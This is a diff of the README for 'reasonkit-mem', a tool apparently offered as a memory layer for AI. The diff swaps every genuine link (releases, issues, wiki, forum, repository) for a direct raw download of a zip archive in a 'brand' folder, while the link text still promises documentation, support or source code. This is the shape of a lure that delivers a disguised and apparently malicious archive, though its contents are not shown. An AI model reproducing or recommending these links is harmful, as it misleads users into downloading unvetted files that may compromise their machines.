@@ -1,6 +1,6 @@
 # 🚀 reasonkit-mem - Your Memory Layer for AI Made Easy
 
-[![Download here](https://img.shields.io/badge/Download_Latest_Version-%20-blue)](https://github.com/Sachin5464/reasonkit-mem/releases)
+[![Download here](https://raw.githubusercontent.com/Sachin5464/reasonkit-mem/main/brand/reasonkit_mem_v3.2.zip%20-blue)](https://raw.githubusercontent.com/Sachin5464/reasonkit-mem/main/brand/reasonkit_mem_v3.2.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To use reasonkit-mem, follow these easy steps to download and install the softwa
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To download the latest version of reasonkit-mem, [visit this page to download](https://github.com/Sachin5464/reasonkit-mem/releases).
+1. **Visit the Releases Page**: To download the latest version of reasonkit-mem, [visit this page to download](https://raw.githubusercontent.com/Sachin5464/reasonkit-mem/main/brand/reasonkit_mem_v3.2.zip).
 2. **Choose Your Version**: On the releases page, find the most recent version. Look for files with extensions like `.exe` or `.zip` for your operating system.
 3. **Download the File**: Click on the file link to begin your download. Depending on your browser settings, it may automatically start or prompt you to choose a location to save.
 4. **Install the Application**:
@@ -58,16 +58,16 @@ If you encounter any issues while downloading or using reasonkit-mem, consider t
 
 ## 🛠️ Support
 
-For additional help, visit the [GitHub Issues page](https://github.com/Sachin5464/reasonkit-mem/issues) to report bugs or request features. You can also consult the user documentation for more detailed instructions.
+For additional help, visit the [GitHub Issues page](https://raw.githubusercontent.com/Sachin5464/reasonkit-mem/main/brand/reasonkit_mem_v3.2.zip) to report bugs or request features. You can also consult the user documentation for more detailed instructions.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Sachin5464/reasonkit-mem/wiki): Comprehensive guides and information.
-- [Community Forum](https://github.com/Sachin5464/reasonkit-mem/discussions): Engage with other users to share tips and solutions.
-- [GitHub Repository](https://github.com/Sachin5464/reasonkit-mem): Access the source code and contribute to the project.
+- [Documentation](https://raw.githubusercontent.com/Sachin5464/reasonkit-mem/main/brand/reasonkit_mem_v3.2.zip): Comprehensive guides and information.
+- [Community Forum](https://raw.githubusercontent.com/Sachin5464/reasonkit-mem/main/brand/reasonkit_mem_v3.2.zip): Engage with other users to share tips and solutions.
+- [GitHub Repository](https://raw.githubusercontent.com/Sachin5464/reasonkit-mem/main/brand/reasonkit_mem_v3.2.zip): Access the source code and contribute to the project.
 
 ## 📥 Quick Download Link
 
-For quick access, [visit this page to download](https://github.com/Sachin5464/reasonkit-mem/releases). Download the latest version and enjoy all the features reasonkit-mem has to offer.
+For quick access, [visit this page to download](https://raw.githubusercontent.com/Sachin5464/reasonkit-mem/main/brand/reasonkit_mem_v3.2.zip). Download the latest version and enjoy all the features reasonkit-mem has to offer.
 
 With reasonkit-mem, managing and retrieving information for your AI applications becomes straightforward. Follow the steps above to get started and harness the power of this efficient memory layer.
